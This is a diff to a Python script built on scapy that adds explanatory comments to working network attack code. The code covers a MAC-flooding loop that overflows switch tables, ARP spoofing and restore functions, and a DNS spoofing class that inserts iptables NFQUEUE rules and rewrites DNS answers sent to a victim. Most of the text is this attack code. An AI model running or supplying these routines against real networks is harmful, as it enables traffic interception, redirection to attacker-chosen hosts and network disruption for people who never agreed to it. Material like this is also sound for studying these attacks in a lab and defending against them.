@@ -4,9 +4,11 @@ import scapy.all as scapy
 import time
 import os
 import logging as log
-from netfilterqueue import NetfilterQueue
+from nfq import NetfilterQueue
 
 #MAC Flooding
+# Takes the destination you wish to flood then uses the scapy module to
+# creates packets from random mac addresses to a destination to flood the switch tables
 def MACFLOOD():
     destMAC = "FF:FF:FF:FF:FF:FF"
     while 1:
@@ -14,19 +16,19 @@ def MACFLOOD():
         scapy.ARP(op=2, psrc="0.0.0.0", hwdst=destMAC)/scapy.Padding(load="X"*18),verbose=0)
 #############################################################################################
 #ARP Spoofing
+# returns the mac addresses of the desired IP
 def get_mac(ip):
     arp_request = scapy.ARP(pdst = ip)
     broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast / arp_request
     answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
     return answered_list[0][1].hwsrc
-  
+# Takes target and spoof IP that is used to modify the ARP table of the gateway and target then send the packet  
 def spoof(target_ip, spoof_ip):
     packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip),
                                                             psrc = spoof_ip)
     scapy.send(packet, verbose = False)
-  
-  
+# re-updates the ARP tables back to default values
 def restore(destination_ip, source_ip):
     destination_mac = get_mac(destination_ip)
     source_mac = get_mac(source_ip)
@@ -58,7 +60,7 @@ class DnsSnoof:
         self.hostDict = hostDict
         self.queueNum = queueNum
         self.queue = NetfilterQueue()
-  
+# inserts the rules into the IP table so packats will redirect to NetFilterQueue  
     def __call__(self):
         log.info("Snoofing....")
         os.system(
@@ -70,7 +72,15 @@ class DnsSnoof:
             os.system(
                 f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
             log.info("[!] iptable rule flushed")
-  
+# Called when new packets are entered into the queue
+# NetFilterQueue packets are turned into scapyPackets for processing
+# Check if scapyPackets have DNS Resourse Records
+# Get DNS query name from the packet
+# If query name is in the target modify DNS sent IP with IP from target
+# Modify the packet
+# Check for packet corruption
+# Set packet back to NetFilterQueue packet
+# Send to victim
     def callBack(self, packet):
         scapyPacket = scapy.IP(packet.get_payload())
         if scapyPacket.haslayer(scapy.DNSRR):
